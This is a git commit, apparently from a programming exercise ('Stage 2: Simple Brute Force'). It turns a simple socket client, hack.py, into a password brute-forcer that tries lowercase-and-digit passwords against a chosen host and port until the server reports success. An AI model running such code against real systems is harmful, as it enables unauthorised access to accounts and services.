3169c2213e8b7c57f91c4b0d37cc0c5e32e47265
Tim Reddish <xynomix@gmail.com>
2020-12-06 21:20:17 +0000

    Stage 2: Simple Brute Force

--- hack.py
+++ hack.py
@@ -1,20 +1,38 @@
 import argparse
 import socket
+import itertools
+import string
+
+
+# Password Generator
+def password_generator(max_length=10):
+    # Set Complexity
+    lowercase = list(string.ascii_lowercase)
+    digits = list(string.digits)
+
+    for i in range(1, max_length):
+        complexity = itertools.chain(lowercase, digits)
+        for passwd in itertools.product(complexity, repeat=i):
+            yield "".join(passwd)
+
 
 # Parse Arguments
 parser = argparse.ArgumentParser()
 parser.add_argument("hostname", type=str)
 parser.add_argument("port", type=int)
-parser.add_argument("message", type=str)
 args = parser.parse_args()
 
 # Connect
 address = (args.hostname, args.port)
-client_socket = socket.socket()
-client_socket.connect(address)
+with socket.socket() as client_socket:
+    client_socket.connect(address)
+    gen_password = password_generator()
 
-# Send & Receive Data
-client_socket.send(args.message.encode())
-response = client_socket.recv(1024)
-response = response.decode()
-print(response)
+    while True:
+        password = next(gen_password)
+        client_socket.send(password.encode())
+        response = client_socket.recv(1024)
+        response = response.decode()
+        if response == "Connection success!":
+            print(password)
+            break
